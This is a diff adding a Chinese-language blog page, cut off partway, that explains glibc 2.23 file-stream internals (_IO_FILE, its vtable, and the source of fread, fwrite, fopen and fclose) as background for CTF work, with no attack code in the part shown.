@@ -1,0 +1,2138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#005f6b">
+  <meta name="description" content="Software Security Researcher">
+  <meta name="author" content>
+  <meta name="keywords" content>
+  <title>IO_FILE in CTF - B3ale</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<link rel="alternate" href="/atom.xml" title="B3ale" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>B3ale</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Sunday, April 19th 2020, 2:44 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    8.2k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      43 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>记录 IO_FILE 相关知识。</p>
+<a id="more"></a>
+<h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Ubuntu 16.04.6（glibc-2.23）：</p>
+<pre><code class="bash">$ uname -a
+Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+<h1 id="FILE-Structure"><a href="#FILE-Structure" class="headerlink" title="FILE Structure"></a>FILE Structure</h1><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 <code>fopen</code> 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。FILE 相关的结构定义在 <a href="https://code.woboq.org/userspace/glibc/libio/libio.h.html" target="_blank" rel="noopener">glibc/libio/libio.h</a> 中：</p>
+<pre><code class="cpp">struct _IO_FILE {
+  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
+#define _IO_file_flags _flags
+
+  /* The following pointers correspond to the C++ streambuf protocol. */
+  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
+  char* _IO_read_ptr;    /* Current read pointer */
+  char* _IO_read_end;    /* End of get area. */
+  char* _IO_read_base;    /* Start of putback+get area. */
+  char* _IO_write_base;    /* Start of put area. */
+  char* _IO_write_ptr;    /* Current put pointer. */
+  char* _IO_write_end;    /* End of put area. */
+  char* _IO_buf_base;    /* Start of reserve area. */
+  char* _IO_buf_end;    /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  char *_IO_save_base; /* Pointer to start of non-current get area. */
+  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+  char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+  struct _IO_marker *_markers;
+
+  struct _IO_FILE *_chain;
+
+  int _fileno;
+#if 0
+  int _blksize;
+#else
+  int _flags2;
+#endif
+  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */
+
+#define __HAVE_COLUMN /* temporary */
+  /* 1+column number of pbase(); 0 is unknown. */
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+
+  /*  char* _save_gptr;  char* _save_egptr; */
+
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+</code></pre>
+<p>进程中的 FILE 结构会通过 <code>_chain</code> 域彼此连接形成一个链表，链表头部用全局变量 <code>_IO_list_all</code> 表示，通过这个值可以遍历所有的 FILE 结构。在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，<code>_IO_list_all</code> 指向了一个有这些文件流构成的链表，这三个文件流位于 libc.so 的数据段；而使用 <code>fopen</code> 创建的文件流是分配在堆内存上的。</p>
+<pre><code class="bash">$ strings /lib/x86_64-linux-gnu/libc.so.6 | grep -E &quot;stdin|stdout|stderr&quot;
+stderr
+_IO_2_1_stderr_
+_IO_2_1_stdout_
+stdout
+_IO_2_1_stdin_
+stdin
+stdin
+stdout
+stderr
+rcmd: write (setting up stderr): %m
+rcmd: poll (setting up stderr): %m
+</code></pre>
+<p>而在 <code>_IO_FILE</code> 结构体外还有一层结构体叫做 <code>_IO_FILE_plus</code>（<a href="https://code.woboq.org/userspace/glibc/libio/libioP.h.html" target="_blank" rel="noopener">glibc/libio/libioP.h</a>），其中包含了一个指针 <code>vtable</code>，其指向了一系列函数（在 libc-2.23 下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8）：</p>
+<pre><code class="cpp">/* We always allocate an extra word following an _IO_FILE.
+   This contains a pointer to the function jump table used.
+   This is for compatibility with C++ streambuf; the word can
+   be used to smash to a pointer to a virtual function table. */
+
+struct _IO_FILE_plus
+{
+  _IO_FILE file;
+  const struct _IO_jump_t *vtable;
+};
+</code></pre>
+<p>其中 <code>vtable</code> 是 <code>_IO_jump_t</code> 结构体，用于保存函数指针：</p>
+<pre><code class="cpp">#define JUMP_FIELD(TYPE, NAME) TYPE NAME
+...
+struct _IO_jump_t
+{
+    JUMP_FIELD(size_t, __dummy);
+    JUMP_FIELD(size_t, __dummy2);
+    JUMP_FIELD(_IO_finish_t, __finish);
+    JUMP_FIELD(_IO_overflow_t, __overflow);
+    JUMP_FIELD(_IO_underflow_t, __underflow);
+    JUMP_FIELD(_IO_underflow_t, __uflow);
+    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    /* showmany */
+    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    JUMP_FIELD(_IO_sync_t, __sync);
+    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    JUMP_FIELD(_IO_read_t, __read);
+    JUMP_FIELD(_IO_write_t, __write);
+    JUMP_FIELD(_IO_seek_t, __seek);
+    JUMP_FIELD(_IO_close_t, __close);
+    JUMP_FIELD(_IO_stat_t, __stat);
+    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    JUMP_FIELD(_IO_imbue_t, __imbue);
+#if 0
+    get_column;
+    set_column;
+#endif
+};
+</code></pre>
+<p>在 <a href="https://code.woboq.org/userspace/glibc/libio/fileops.c.html" target="_blank" rel="noopener">glibc/libio/fileops.c</a> 中可以看到一般情况下 vtable 表默认指向的各个函数：</p>
+<pre><code class="cpp">const struct _IO_jump_t _IO_file_jumps =
+{
+  JUMP_INIT_DUMMY,
+  JUMP_INIT(finish, _IO_file_finish),
+  JUMP_INIT(overflow, _IO_file_overflow),
+  JUMP_INIT(underflow, _IO_file_underflow),
+  JUMP_INIT(uflow, _IO_default_uflow),
+  JUMP_INIT(pbackfail, _IO_default_pbackfail),
+  JUMP_INIT(xsputn, _IO_file_xsputn),
+  JUMP_INIT(xsgetn, _IO_file_xsgetn),
+  JUMP_INIT(seekoff, _IO_new_file_seekoff),
+  JUMP_INIT(seekpos, _IO_default_seekpos),
+  JUMP_INIT(setbuf, _IO_new_file_setbuf),
+  JUMP_INIT(sync, _IO_new_file_sync),
+  JUMP_INIT(doallocate, _IO_file_doallocate),
+  JUMP_INIT(read, _IO_file_read),
+  JUMP_INIT(write, _IO_new_file_write),
+  JUMP_INIT(seek, _IO_file_seek),
+  JUMP_INIT(close, _IO_file_close),
+  JUMP_INIT(stat, _IO_file_stat),
+  JUMP_INIT(showmanyc, _IO_default_showmanyc),
+  JUMP_INIT(imbue, _IO_default_imbue)
+};
+</code></pre>
+<h2 id="fread"><a href="#fread" class="headerlink" title="fread()"></a><code>fread()</code></h2><p><code>fread()</code> 是标准 IO 库函数，作用是从文件流中读数据，在 <a href="https://code.woboq.org/userspace/glibc/libio/iofread.c.html" target="_blank" rel="noopener">glibc/libio/iofread.c</a> 中实现，实际函数名为 <code>_IO_fread</code>。其中 buf 为存放数据的缓冲区，size 指定一个数据项对应的字节数，count 指定读入数据的个数，fp 为目标文件流。一开始的 <code>CHECK_FILE</code> 就是检查一个 Magic Number，真正的读功能在 <code>_IO_sgetn</code> 中实现：</p>
+<pre><code class="cpp">_IO_size_t
+_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
+{
+  _IO_size_t bytes_requested = size * count;
+  _IO_size_t bytes_read;
+  CHECK_FILE (fp, 0);
+  if (bytes_requested == 0)
+    return 0;
+  _IO_acquire_lock (fp);
+  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
+  _IO_release_lock (fp);
+  return bytes_requested == bytes_read ? count : bytes_read / size;
+}
+</code></pre>
+<p><code>_IO_sgetn</code> 则在 <a href="https://code.woboq.org/userspace/glibc/libio/genops.c.html" target="_blank" rel="noopener">glibc/libio/genops.c</a> 中实现，其中调用了 <code>_IO_XSGETN</code>：</p>
+<pre><code class="cpp">_IO_size_t
+_IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n)
+{
+  /* FIXME handle putback buffer here! */
+  return _IO_XSGETN (fp, data, n);
+}
+</code></pre>
+<p>而 <code>_IO_XSGETN</code> 在 <a href="https://code.woboq.org/userspace/glibc/libio/libio.h.html" target="_blank" rel="noopener">glibc/libio/libio.h</a> 中实现。把宏一个一个展开来大概可以看出用于获取 vtable 对应的函数 <code>__xsgetn</code>：</p>
+<pre><code class="cpp">#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
+...
+#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)
+...
+#if _IO_JUMPS_OFFSET
+# define _IO_JUMPS_FUNC(THIS) \
+ (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \
+               + (THIS)-&gt;_vtable_offset))
+# define _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset
+#else
+# define _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)
+# define _IO_vtable_offset(THIS) 0
+#endif
+...
+#define _IO_JUMPS_FILE_plus(THIS) \
+  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)
+...
+/* Essentially ((TYPE *) THIS)-&gt;MEMBER, but avoiding the aliasing
+   violation in case THIS has a different pointer type.  */
+#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \
+  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
+                       + offsetof(TYPE, MEMBER)))
+...
+/* Type of MEMBER in struct type TYPE.  */
+#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)
+</code></pre>
+<p>而默认情况下这个指针是指向 <code>_IO_file_xsgetn</code> 的：</p>
+<pre><code class="cpp">_IO_size_t
+_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
+{
+  _IO_size_t want, have;
+  _IO_ssize_t count;
+  char *s = data;
+
+  want = n;
+
+  if (fp-&gt;_IO_buf_base == NULL)
+    {
+      /* Maybe we already have a push back pointer.  */
+      if (fp-&gt;_IO_save_base != NULL)
+    {
+      free (fp-&gt;_IO_save_base);
+      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;
+    }
+      _IO_doallocbuf (fp);
+    }
+
+  while (want &gt; 0)
+    {
+      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;
+      if (want &lt;= have)
+    {
+      memcpy (s, fp-&gt;_IO_read_ptr, want);
+      fp-&gt;_IO_read_ptr += want;
+      want = 0;
+    }
+      else
+    {
+      if (have &gt; 0)
+        {
+#ifdef _LIBC
+          s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);
+#else
+          memcpy (s, fp-&gt;_IO_read_ptr, have);
+          s += have;
+#endif
+          want -= have;
+          fp-&gt;_IO_read_ptr += have;
+        }
+
+      /* Check for backup and repeat */
+      if (_IO_in_backup (fp))
+        {
+          _IO_switch_to_main_get_area (fp);
+          continue;
+        }
+
+      /* If we now want less than a buffer, underflow and repeat
+         the copy.  Otherwise, _IO_SYSREAD directly to
+         the user buffer. */
+      if (fp-&gt;_IO_buf_base
+          &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))
+        {
+          if (__underflow (fp) == EOF)
+        break;
+
+          continue;
+        }
+
+      /* These must be set before the sysread as we might longjmp out
+         waiting for input. */
+      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);
+      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);
+
+      /* Try to maintain alignment: read a whole number of blocks.  */
+      count = want;
+      if (fp-&gt;_IO_buf_base)
+        {
+          _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;
+          if (block_size &gt;= 128)
+        count -= want % block_size;
+        }
+
+      count = _IO_SYSREAD (fp, s, count);
+      if (count &lt;= 0)
+        {
+          if (count == 0)
+        fp-&gt;_flags |= _IO_EOF_SEEN;
+          else
+        fp-&gt;_flags |= _IO_ERR_SEEN;
+
+          break;
+        }
+
+      s += count;
+      want -= count;
+      if (fp-&gt;_offset != _IO_pos_BAD)
+        _IO_pos_adjust (fp-&gt;_offset, count);
+    }
+    }
+
+  return n - want;
+}
+</code></pre>
+<h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite()"></a><code>fwrite()</code></h2><p><code>fwrite</code> 同样是标准 IO 库函数，作用是向文件流写入数据，在 <a href="https://code.woboq.org/userspace/glibc/libio/iofwrite.c.html" target="_blank" rel="noopener">glibc/libio/iofwrite.c</a> 中实现。其中 buf 为一个写入数据的缓冲区，size 为写入的一个数据项对应的字节数，count 为写入的数据总数，stream 为目标文件流：</p>
+<pre><code class="cpp">_IO_size_t
+_IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
+{
+  _IO_size_t request = size * count;
+  _IO_size_t written = 0;
+  CHECK_FILE (fp, 0);
+  if (request == 0)
+    return 0;
+  _IO_acquire_lock (fp);
+  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
+    written = _IO_sputn (fp, (const char *) buf, request);
+  _IO_release_lock (fp);
+  /* We have written all of the input in case the return value indicates
+     this or EOF is returned.  The latter is a special case where we
+     simply did not manage to flush the buffer.  But the data is in the
+     buffer and therefore written as far as fwrite is concerned.  */
+  if (written == request || written == EOF)
+    return count;
+  else
+    return written / size;
+}
+</code></pre>
+<p>主要功能在 <code>_IO_sputn</code> 中：</p>
+<pre><code class="cpp">#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
+</code></pre>
+<p>和前面的 <code>fread</code> 同理，<code>fwrite</code> 最终获取到 vtable 对应的 <code>__xsputn</code> 成员所指向的函数 <code>_IO_file_xsputn</code>（<code>_IO_new_file_xsputn</code>），最终会调用系统接口 <code>write</code> 函数：</p>
+<pre><code class="cpp"># define _IO_new_file_xsputn _IO_file_xsputn
+...
+_IO_size_t
+_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
+{
+  const char *s = (const char *) data;
+  _IO_size_t to_do = n;
+  int must_flush = 0;
+  _IO_size_t count = 0;
+
+  if (n &lt;= 0)
+    return 0;
+  /* This is an optimized implementation.
+     If the amount to be written straddles a block boundary
+     (or the filebuf is unbuffered), use sys_write directly. */
+
+  /* First figure out how much space is available in the buffer. */
+  if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+    {
+      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;
+      if (count &gt;= n)
+    {
+      const char *p;
+      for (p = s + n; p &gt; s; )
+        {
+          if (*--p == &#39;\n&#39;)
+        {
+          count = p - s + 1;
+          must_flush = 1;
+          break;
+        }
+        }
+    }
+    }
+  else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)
+    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */
+
+  /* Then fill the buffer. */
+  if (count &gt; 0)
+    {
+      if (count &gt; to_do)
+    count = to_do;
+#ifdef _LIBC
+      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);
+#else
+      memcpy (f-&gt;_IO_write_ptr, s, count);
+      f-&gt;_IO_write_ptr += count;
+#endif
+      s += count;
+      to_do -= count;
+    }
+  if (to_do + must_flush &gt; 0)
+    {
+      _IO_size_t block_size, do_write;
+      /* Next flush the (full) buffer. */
+      if (_IO_OVERFLOW (f, EOF) == EOF)
+    /* If nothing else has to be written we must not signal the
+       caller that everything has been written.  */
+    return to_do == 0 ? EOF : n - to_do;
+
+      /* Try to maintain alignment: write a whole number of blocks.  */
+      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;
+      do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);
+
+      if (do_write)
+    {
+      count = new_do_write (f, s, do_write);
+      to_do -= count;
+      if (count &lt; do_write)
+        return n - to_do;
+    }
+
+      /* Now write out the remainder.  Normally, this will fit in the
+     buffer, but it&#39;s somewhat messier for line-buffered files,
+     so we let _IO_default_xsputn handle the general case. */
+      if (to_do)
+    to_do -= _IO_default_xsputn (f, s+do_write, to_do);
+    }
+  return n - to_do;
+}
+</code></pre>
+<p><code>printf</code> 和 <code>puts</code> 是常用的输出函数，在 <code>printf</code> 的参数是以 <code>&#39;\n&#39;</code> 结束的纯字符串时，<code>printf</code> 会被优化为 <code>puts</code> 函数并去除换行符。<code>puts</code> 在源码中实现的函数是 <code>_IO_puts</code>，这个函数的操作与 <code>fwrite</code> 的流程大致相同，函数内部同样会调用 vtable 中的 <code>_IO_sputn</code>，结果会执行 <code>_IO_new_file_xsputn</code>，最后会调用到系统接口 write 函数。而 <code>printf</code> 的调用栈回溯如下，同样是通过 <code>_IO_file_xsputn</code>（<code>_IO_new_file_xsputn</code>）实现：</p>
+<pre><code>vfprintf+11
+_IO_file_xsputn
+_IO_file_overflow
+funlockfile
+_IO_file_write
+write
+</code></pre><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a><code>fopen()</code></h2><p><code>fopen</code> 是一个在 <a href="https://code.woboq.org/userspace/glibc/libio/stdio.h.html" target="_blank" rel="noopener">glibc/include/stdio.h</a> 中实现的宏，在标准 IO 库中用于打开文件。其中 fname 指定文件路径，mode 指定打开方式的类型：</p>
+<pre><code class="cpp">#   define fopen(fname, mode) _IO_new_fopen (fname, mode)
+</code></pre>
+<p>对应的 <code>_IO_new_fopen</code> 在 <a href="https://code.woboq.org/userspace/glibc/libio/iofopen.c.html" target="_blank" rel="noopener">glibc/libio/iofopen.c</a> 中实现，其中主要调用了 <code>__fopen_internal</code> 函数：</p>
+<pre><code class="cpp">_IO_FILE *
+_IO_new_fopen (const char *filename, const char *mode)
+{
+  return __fopen_internal (filename, mode, 1);
+}
+</code></pre>
+<p><code>__fopen_internal</code> 内部会调用 <code>malloc</code> 函数，分配 FILE 结构的空间，因此可以获知 FILE 结构是存储在堆上的。之后会为创建的 FILE 初始化 vtable，并调用 <code>_IO_file_init</code> 进一步初始化操作。之后调用 <code>_IO_file_fopen</code> 函数打开目标文件并根据用户传入的打开模式进行打开操作，最后会调用到系统接口 <code>open</code> 函数：</p>
+<pre><code class="cpp">_IO_FILE *
+__fopen_internal (const char *filename, const char *mode, int is32)
+{
+  struct locked_FILE
+  {
+    struct _IO_FILE_plus fp;
+#ifdef _IO_MTSAFE_IO
+    _IO_lock_t lock;
+#endif
+    struct _IO_wide_data wd;
+  } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));
+
+  if (new_f == NULL)
+    return NULL;
+#ifdef _IO_MTSAFE_IO
+  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;
+#endif
+#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
+  _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);
+#else
+  _IO_no_init (&amp;new_f-&gt;fp.file, 1, 0, NULL, NULL);
+#endif
+  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;
+  _IO_file_init (&amp;new_f-&gt;fp);
+#if  !_IO_UNIFIED_JUMPTABLES
+  new_f-&gt;fp.vtable = NULL;
+#endif
+  if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)
+    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);
+
+  _IO_un_link (&amp;new_f-&gt;fp);
+  free (new_f);
+  return NULL;
+}
+</code></pre>
+<p>在 <code>_IO_file_init</code> 函数的初始化操作中，会调用 <code>_IO_link_in</code> 把新分配的 FILE 链入 <code>_IO_list_all</code> 为起始的 FILE 链表中：</p>
+<pre><code class="cpp"># define _IO_new_file_init _IO_file_init
+...
+void
+_IO_new_file_init (struct _IO_FILE_plus *fp)
+{
+  /* POSIX.1 allows another file handle to be used to change the position
+     of our file descriptor.  Hence we actually don&#39;t know the actual
+     position before we do the first fseek (and until a following fflush). */
+  fp-&gt;file._offset = _IO_pos_BAD;
+  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;
+
+  _IO_link_in (fp);
+  fp-&gt;file._fileno = -1;
+}
+...
+_IO_link_in (struct _IO_FILE_plus *fp)
+{
+  if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)
+    {
+      fp-&gt;file._flags |= _IO_LINKED;
+#ifdef _IO_MTSAFE_IO
+      _IO_cleanup_region_start_noarg (flush_cleanup);
+      _IO_lock_lock (list_all_lock);
+      run_fp = (_IO_FILE *) fp;
+      _IO_flockfile ((_IO_FILE *) fp);
+#endif
+      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;
+      _IO_list_all = fp;
+      ++_IO_list_all_stamp;
+#ifdef _IO_MTSAFE_IO
+      _IO_funlockfile ((_IO_FILE *) fp);
+      run_fp = NULL;
+      _IO_lock_unlock (list_all_lock);
+      _IO_cleanup_region_end (0);
+#endif
+    }
+}
+</code></pre>
+<p>最终可以得出 fopen 的操作如下：</p>
+<ul>
+<li>使用 <code>malloc</code> 分配 FILE 结构</li>
+<li>设置 FILE 结构的 vtable</li>
+<li>初始化分配的 FILE 结构</li>
+<li>将初始化的 FILE 结构链入 FILE 结构链表中</li>
+<li>调用系统调用打开文件</li>
+</ul>
+<h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a><code>fclose()</code></h2><p><code>fclose</code> 是标准 IO 库中用于关闭已打开文件的函数，在 <a href="https://code.woboq.org/userspace/glibc/libio/iofclose.c.html" target="_blank" rel="noopener">glibc/include/iofclose.c</a>，宏定义如下。其中 fp 为已经打开的文件流：</p>
+<pre><code class="cpp">#   define fclose(fp) _IO_new_fclose (fp)
+</code></pre>
+<p><code>fclose</code> 首先会调用 <code>_IO_un_link</code> 将指定的 FILE 从 <code>_chain</code> 链表中脱链。之后会调用 <code>_IO_file_close_it</code> 函数，<code>_IO_file_close_it</code> 会调用系统接口 <code>close</code> 关闭文件。最后调用 vtable 中的 <code>_IO_FINISH</code>，其对应的是 <code>_IO_file_finish</code> 函数，其中会调用 <code>free</code> 函数释放之前分配的 FILE 结构：</p>
+<pre><code class="cpp">int
+_IO_new_fclose (_IO_FILE *fp)
+{
+  int status;
+
+  CHECK_FILE(fp, EOF);
+
+#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
+  /* We desperately try to help programs which are using streams in a
+     strange way and mix old and new functions.  Detect old streams
+     here.  */
+  if (_IO_vtable_offset (fp) != 0)
+    return _IO_old_fclose (fp);
+#endif
+
+  /* First unlink the stream.  */
+  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)
+    _IO_un_link ((struct _IO_FILE_plus *) fp);
+
+  _IO_acquire_lock (fp);
+  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)
+    status = _IO_file_close_it (fp);
+  else
+    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;
+  _IO_release_lock (fp);
+  _IO_FINISH (fp);
+  if (fp-&gt;_mode &gt; 0)
+    {
+#if _LIBC
+      /* This stream has a wide orientation.  This means we have to free
+     the conversion functions.  */
+      struct _IO_codecvt *cc = fp-&gt;_codecvt;
+
+      __libc_lock_lock (__gconv_lock);
+      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);
+      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);
+      __libc_lock_unlock (__gconv_lock);
+#endif
+    }
+  else
+    {
+      if (_IO_have_backup (fp))
+    _IO_free_backup_area (fp);
+    }
+  if (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)
+    {
+      fp-&gt;_IO_file_flags = 0;
+      free(fp);
+    }
+
+  return status;
+}
+...
+void
+_IO_un_link (struct _IO_FILE_plus *fp)
+{
+  if (fp-&gt;file._flags &amp; _IO_LINKED)
+    {
+      struct _IO_FILE **f;
+#ifdef _IO_MTSAFE_IO
+      _IO_cleanup_region_start_noarg (flush_cleanup);
+      _IO_lock_lock (list_all_lock);
+      run_fp = (_IO_FILE *) fp;
+      _IO_flockfile ((_IO_FILE *) fp);
+#endif
+      if (_IO_list_all == NULL)
+    ;
+      else if (fp == _IO_list_all)
+    {
+      _IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain;
+      ++_IO_list_all_stamp;
+    }
+      else
+    for (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)
+      if (*f == (_IO_FILE *) fp)
+        {
+          *f = fp-&gt;file._chain;
+          ++_IO_list_all_stamp;
+          break;
+        }
+      fp-&gt;file._flags &amp;= ~_IO_LINKED;
+#ifdef _IO_MTSAFE_IO
+      _IO_funlockfile ((_IO_FILE *) fp);
+      run_fp = NULL;
+      _IO_lock_unlock (list_all_lock);
+      _IO_cleanup_region_end (0);
+#endif
+    }
+}
+...
+# define _IO_new_file_close_it _IO_file_close_it
+...
+int
+_IO_new_file_close_it (_IO_FILE *fp)
+{
+  int write_status;
+  if (!_IO_file_is_open (fp))
+    return EOF;
+
+  if ((fp-&gt;_flags &amp; _IO_NO_WRITES) == 0
